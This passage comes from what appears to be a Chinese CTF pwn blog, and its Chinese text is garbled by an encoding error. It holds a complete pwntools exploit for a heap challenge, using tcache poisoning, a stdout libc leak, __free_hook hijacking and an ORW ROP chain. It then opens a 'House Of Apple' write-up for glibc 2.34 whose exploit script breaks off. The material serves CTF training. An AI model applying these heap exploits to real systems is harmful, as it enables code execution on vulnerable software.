<li>È¶ñÂÖàÔºåÂú®ÂÆåÊàêÊ†àËøÅÁßª‰πãÂâçÊàë‰ª¨‰∏çËÉΩ‰ΩøÁî®Ê†àÔºåÂõ†Ê≠§ÈúÄË¶Å <code>call</code> Êù•ËøûÊé• gadgetÔºöÔºàÂèØ‰ª•ÂÖàÊääÂ∏¶Êúâ <code>call</code> ÁöÑ gadget ‰øùÂ≠òÂà∞Âè¶‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÔºåÁÑ∂ÂêéÊêúÁ¥¢ RDIÔºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, qword ptr [rdi + <span class="number">8</span>]; call qword ptr [rax + <span class="number">0x30</span>]; </span><br></pre></td></tr></table></figure>
<ul>
<li>ÊÉ≥ËøôÁßçÂü∫‰∫é RAX ÁöÑ <code>call</code> Êàë‰ª¨‰∏ÄËà¨‰∏çÈááÁî®ÔºåËôΩÁÑ∂ÂÆÉÂæàÂ§öÔºå‰ΩÜÊòØÂæàÈöæËøõË°åÊ†àËøÅÁßª</li>
<li>Êàë‰ª¨ÈÄöÂ∏∏‰ΩøÁî® RDIÔºåRSIÔºåRDXÔºåRBP Ëøô4‰∏™ÂØÑÂ≠òÂô®Êù•ÂÅöÊ†àËøÅÁßªÔºåÂõ†Ê≠§‰ºòÂÖà‰ΩøÁî®Â∏¶ÊúâÂÆÉ‰ª¨ÁöÑ <code>call</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + <span class="number">8</span>]; mov qword ptr [rsp], rax; call qword ptr [rdx + <span class="number">0x20</span>]; </span><br><span class="line">mov rsp, rdx; ret; </span><br></pre></td></tr></table></figure>
<p>Áî±‰∫éÂÜôÂÖ•ÈïøÂ∫¶ÂèóÈôêÔºåÊàë‰ª¨ÈúÄË¶ÅÊâãÂä®ÊâßË°å‰∏ÄÊ¨° <code>gets</code> ÂÜôÂÖ• ORW Èìæ</p>
<p>ÂÆåÊï¥ expÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./only&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">local = 1</span></span><br><span class="line"><span class="string">if local:</span></span><br><span class="line"><span class="string">    p = process(challenge)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    p = remote(&#x27;172.51.221.20&#x27;,&#x27;9999&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1B0A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice &gt;&gt; &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>():</span></span><br><span class="line">    choice(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>():</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0xe0</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    dele()</span><br><span class="line">    fill()</span><br><span class="line">    dele()</span><br><span class="line"></span><br><span class="line">    success(<span class="string">&quot;stdout &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]))</span><br><span class="line">    _IO_2_1_stdout_offset = <span class="number">0x96a0</span></span><br><span class="line">    head_offset = <span class="number">0xb7f0</span></span><br><span class="line">    head_offset2 = <span class="number">0xb800</span></span><br><span class="line">   </span><br><span class="line">    add(<span class="number">0xe0</span>,p16(head_offset))</span><br><span class="line">    add(<span class="number">0xe0</span>,p16(head_offset))</span><br><span class="line">    add(<span class="number">0xe0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x491</span>)+p16(head_offset2))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    dele()</span><br><span class="line">    add(<span class="number">0x30</span>, p16(_IO_2_1_stdout_offset))</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x00\n&#x27;</span></span><br><span class="line">    add(<span class="number">0x60</span>, payload)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">    success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free_hook = libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    puts_libc = libc_base+libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    gets_libc = libc_base+libc.sym[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">    success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(free_hook))  </span><br><span class="line">    </span><br><span class="line">    gadget1 = libc_base + <span class="number">0x00000000001547a0</span></span><br><span class="line">    <span class="comment"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">    gadget2 = libc_base + <span class="number">0x000000000005e650</span></span><br><span class="line">    <span class="comment"># mov rsp, rdx; ret; </span></span><br><span class="line">    gadget3 = libc_base + <span class="number">0x000000000004a5c5</span></span><br><span class="line">    <span class="comment"># add rsp, 0x28; ret; </span></span><br><span class="line">    success(<span class="string">&quot;gadget1 &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(gadget1))</span><br><span class="line"></span><br><span class="line">    pop_rax_ret = libc_base + <span class="number">0x000000000004a550</span></span><br><span class="line">    pop_rdi_ret = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">    pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011c1e1</span></span><br><span class="line">    syscall_ret = libc_base + <span class="number">0x0000000000066229</span></span><br><span class="line">    success(<span class="string">&quot;syscall_ret &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(syscall_ret))</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0x81</span>) + p64(free_hook) </span><br><span class="line">    add(<span class="number">0xe0</span>, payload)</span><br><span class="line"></span><br><span class="line">    flag_addr = free_hook + <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">    ORW =  <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="comment"># open(bss_addr,0)</span></span><br><span class="line">    ORW += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">    ORW += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">    ORW += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(pop_rdx_r12_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(syscall_ret)</span><br><span class="line">    <span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">    ORW += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">    ORW += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">    ORW += p64(pop_rdx_r12_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(syscall_ret)</span><br><span class="line">    <span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">    ORW += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    ORW += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    ORW += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">    ORW += p64(pop_rdx_r12_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    payload = p64(gadget1) + p64(free_hook+<span class="number">0x10</span>) </span><br><span class="line">    payload += p64(gadget3) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(gadget2) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(free_hook+<span class="number">0x50</span>) + p64(gets_libc)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0x70</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    dele()</span><br><span class="line"></span><br><span class="line">    p.sendline(ORW)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    elf = ELF(challenge)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(challenge,timeout=<span class="number">1</span>)</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">elf = ELF(challenge)</span></span><br><span class="line"><span class="string">libc = ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line"><span class="string">p = process(challenge)</span></span><br><span class="line"><span class="string">pwn()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/10/House%20Of%20Apple-2.34-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/10/House%20Of%20Apple-2.34-64/" class="post-title-link" itemprop="url">House Of Apple-2.34-64</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-10 02:25:44 / Modified: 02:30:26" itemprop="dateCreated datePublished" datetime="2022-11-10T02:25:44+08:00">2022-11-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>oneday</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(GNU libc)</span> stable release version 2.34.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">oneday: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=f0ed246b7bd4e5f07caab6ba718a7e0e05c918b7, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64‰ΩçÔºådynamicallyÔºåÂÖ®ÂºÄ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>Á¶ÅÁî® <code>execve</code></li>
</ul>
<p><strong>ÂÖ•‰æµÊÄùË∑Ø</strong></p>
<p>‰ΩøÁî® House Of Apple2Ôºö</p>
<ul>
<li>ÂÖàÁî®‰∏Ä‰∏™ largebin attack Êù•Âä´ÊåÅ <code>stderr _IO_FILE</code> </li>
<li>ÂÆåÊàê House Of Apple2 ÁöÑ‰º™ÈÄ†</li>
<li>main ÂáΩÊï∞ËøîÂõûÂêéÊâßË°å <code>exit</code>ÔºåËß¶Âèë IO ÊµÅ</li>
</ul>
<p>ËøôÂÖ∂‰∏≠ÈúÄË¶ÅÊ≥®ÊÑè‰∏Ä‰∏™ÈóÆÈ¢òÔºåËØ•Á®ãÂ∫èÂè™Êúâ‰∏ÄÊ¨°ËæìÂá∫ÁöÑÊú∫‰ºöÔºå‰πüÂ∞±ÊòØËØ¥ largebin attack Âíå <code>_IO_FILE</code> ÁöÑ‰º™ÈÄ†ÂøÖÈ°ªÊîæÂÖ•Áî®‰∏Ä‰∏™ chunk ‰∏≠</p>
<p>‰ΩÜ largebin attack ÁöÑÊïàÊûúÊòØÊää unsorted chunk ÊîæÂÖ• <code>_IO_list_all</code>ÔºåÈÇ£‰πàÂ∞±ÂøÖÈ°ªÂÖàÂà©Áî®Â†ÜÈ£éÊ∞¥ËÆ© unsorted chunk Âíå large chunk ÈáçÂè†</p>
<ul>
<li>ÂÖ∑‰ΩìÁöÑÊñπÊ≥ïÂ∞±ÊòØÈáäÊîæÈÅóÁïôÂú® chunk_list ‰∏≠ÁöÑ chunk ÊåáÈíàÔºàÂêë large chunk ÂÜôÂÖ•Êï∞ÊçÆÊó∂ÔºåÂ∞±Ë¶Å‰º™ÈÄ†ÁõÆÊ†á chunkÔºå‰ΩøÂÖ∂ÂêàÊ≥ïÔºâ</li>
</ul>
<p>Ë∞ÉÁî®ÈìæÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> -&gt; __run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; target</span><br></pre></td></tr></table></figure>
<p>Êú¨È¢òÁõÆËøòÈúÄË¶Å‰∏Ä‰∏™ÁâπÊÆäÁöÑ gadget Êù•Âä´ÊåÅÁ®ãÂ∫èÊµÅ <code>libc.sym[&#39;svcudp_reply&#39;]+26</code>ÔºåÂÆÉÁöÑÊïàÊûúÂíå <code>setcontext+61</code> Á±ª‰ººÔºå‰ΩÜÂÆÉÈúÄË¶ÅÊéßÂà∂ RDI ÂØÑÂ≠òÂô®Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">‚ñ∫ <span class="number">0x7f02e97842ba</span> &lt;svcudp_reply+<span class="number">26</span>&gt;    mov    rbp, qword ptr [rdi + <span class="number">0x48</span>]</span><br><span class="line">  <span class="number">0x7f02e97842be</span> &lt;svcudp_reply+<span class="number">30</span>&gt;    mov    rax, qword ptr [rbp + <span class="number">0x18</span>]</span><br><span class="line">  <span class="number">0x7f02e97842c2</span> &lt;svcudp_reply+<span class="number">34</span>&gt;    lea    r13, [rbp + <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0x7f02e97842c6</span> &lt;svcudp_reply+<span class="number">38</span>&gt;    mov    dword ptr [rbp + <span class="number">0x10</span>], <span class="number">0</span></span><br><span class="line">  <span class="number">0x7f02e97842cd</span> &lt;svcudp_reply+<span class="number">45</span>&gt;    mov    rdi, r13</span><br><span class="line">  <span class="number">0x7f02e97842d0</span> &lt;svcudp_reply+<span class="number">48</span>&gt;    call   qword ptr [rax + <span class="number">0x28</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>Áî±‰∫éÊú¨È¢òÁõÆÊ≤°Ê≥ïÊéßÂà∂ RDX ÂØÑÂ≠òÂô®ÔºåÂõ†Ê≠§ÊâçÁî®ËøôÁßçÊñπÂºèÊù•Êõø‰ª£ <code>setcontext+61</code></li>
<li>RDI ÂØÑÂ≠òÂô®ÂÖ∂ÂÆûÂ∞±ÊåáÂêë <code>fake_IO_FILE</code> ÁöÑËµ∑ÂßãÂú∞ÂùÄÔºå‰πüÂ∞±ÊòØ <code>fake_io_addr</code></li>
</ul>
<p>ÂÆåÊï¥ expÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./oneday1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.20&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b 